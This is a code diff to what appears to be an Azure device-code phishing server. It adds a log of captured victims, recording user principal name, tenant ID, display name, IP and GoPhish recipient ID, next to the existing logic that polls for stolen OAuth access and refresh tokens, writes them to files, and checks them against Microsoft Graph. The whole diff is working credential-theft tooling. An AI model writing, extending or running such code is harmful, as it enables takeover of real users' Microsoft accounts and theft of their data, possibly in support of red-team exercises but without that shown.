@@ -31,6 +31,7 @@ const defaultConfig = {
     logFile: "logfile.txt",
     tokenFile: "tokens.txt",
     visitLogFile: "visits.tsv",
+    captureLogFile: "captures.tsv",
     threemaOn: false,
     threemaTo: ["YourID1","YourID2"],
     threemaFrom: "YourName",
@@ -82,6 +83,14 @@ function visitLogPath() {
     return config.visitLogFile || 'visits.tsv';
 }
 
+function captureLogPath() {
+    return config.captureLogFile || 'captures.tsv';
+}
+
+function tsvCell(value) {
+    return String(value ?? '').replace(/[\t\r\n]+/g, ' ').slice(0, 500);
+}
+
 function clientIp(req) {
     return (
         req.headers['cf-connecting-ip'] ||
@@ -123,6 +132,30 @@ function appendVisitRow({ code, recipient = '', gophishRid = '', ip = '', status
         safeDetail,
     ].join('\t') + '\n';
     writeToFile(visitLogPath(), row);
+}
+
+function appendCaptureRow({
+    code,
+    recipient = '',
+    gophishRid = '',
+    ip = '',
+    user = '',
+    tenantId = '',
+    displayName = '',
+    graphStatus = '',
+}) {
+    const row = [
+        getTime().trim(),
+        code,
+        tsvCell(recipient),
+        tsvCell(gophishRid),
+        tsvCell(ip),
+        tsvCell(user),
+        tsvCell(tenantId),
+        tsvCell(displayName),
+        tsvCell(graphStatus),
+    ].join('\t') + '\n';
+    writeToFile(captureLogPath(), row);
 }
 
 function registerVisit(code, { recipient, gophishRid, ip, route }) {
@@ -210,15 +243,27 @@ function pollForAzureTokens(deviceCode, userCode, oauthConfig = config) {
                     }
                 }
                 if (pollResult.access_token) {
+                    const visit = activeVisits.get(userCode) || {};
                     const resolved = await resolveCaptureIdentity(pollResult);
                     finalizeVisit(userCode, 'captured', resolved.identity.upn);
                     writeToFile(config.userCodesFile, userCode + '\n');
                     writeToFile(config.tokenFile, getTime() + formatAzureToken('Usercode: ' + userCode, pollResult));
                     writeToFile(userCode, JSON.stringify(pollResult, null, 4));
                     logCaptureFiles(userCode);
+                    let graphStatus = 'not_checked';
                     if (config.validateTokens !== false) {
-                        await validateCapturedTokens(userCode, pollResult, oauthConfig, resolved);
+                        graphStatus = await validateCapturedTokens(userCode, pollResult, oauthConfig, resolved);
                     }
+                    appendCaptureRow({
+                        code: userCode,
+                        recipient: visit.recipient,
+                        gophishRid: visit.gophishRid,
+                        ip: visit.ip,
+                        user: resolved.identity.upn,
+                        tenantId: resolved.identity.tenantId,
+                        displayName: resolved.identity.displayName,
+                        graphStatus,
+                    });
                     sendThreemaNotifications();
                     clearInterval(interval);
                 }
@@ -499,14 +544,14 @@ async function validateCapturedTokens(userCode, pollResult, oauthConfig = config
             `GRAPH OK — ${profile.displayName || profile.userPrincipalName} (${profile.userPrincipalName})`,
             'success'
         );
-        return;
+        return 'ok';
     }
 
     logMessage(describeGraphFailure(graphResult.status, graphResult.body));
 
     if (!pollResult.refresh_token) {
         logMessage('REFRESH SKIP — no refresh_token in response');
-        return;
+        return 'graph_failed';
     }
 
     logMessage('Trying refresh_token exchange for Graph scope ...', 'debug');
@@ -514,12 +559,12 @@ async function validateCapturedTokens(userCode, pollResult, oauthConfig = config
 
     if (refreshResult.body.error) {
         logMessage(describeRefreshFailure(refreshResult.body));
-        return;
+        return 'refresh_denied';
     }
 
     if (!refreshResult.body.access_token) {
         logMessage('REFRESH FAILED — no access_token in refresh response', 'error');
-        return;
+        return 'refresh_failed';
     }
 
     writeToFile(`${userCode}.graph-refresh.json`, JSON.stringify(refreshResult.body, null, 4) + '\n');
@@ -533,10 +578,11 @@ async function validateCapturedTokens(userCode, pollResult, oauthConfig = config
             'success'
         );
         logMessage(`Refreshed token JSON: ${refreshPath}`);
-        return;
+        return 'refresh_ok';
     }
 
     logMessage(describeGraphFailure(graphResult.status, graphResult.body) + ' (refreshed token issued)');
+    return 'graph_failed';
 }
 
 async function fetchDeviceCode(oauthConfig = config) {
